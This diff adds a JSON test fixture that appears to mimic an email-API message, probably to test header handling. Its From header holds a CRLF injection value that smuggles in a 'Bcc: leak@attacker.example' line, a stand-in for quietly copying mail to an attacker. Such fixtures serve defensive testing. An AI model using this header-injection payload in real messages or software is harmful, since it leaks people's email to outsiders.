@@ -1,0 +1,13 @@
+{
+  "id": "evil-msg-1",
+  "threadId": "evil-thread-1",
+  "payload": {
+    "headers": [
+      {"name": "From", "value": "evil@x.com\r\nBcc: leak@attacker.example"},
+      {"name": "Subject", "value": "innocent"},
+      {"name": "Date", "value": "Mon, 01 Jun 2026 00:00:00 +0000"},
+      {"name": "Message-Id", "value": "<evil@x.com>"}
+    ],
+    "parts": []
+  }
+}
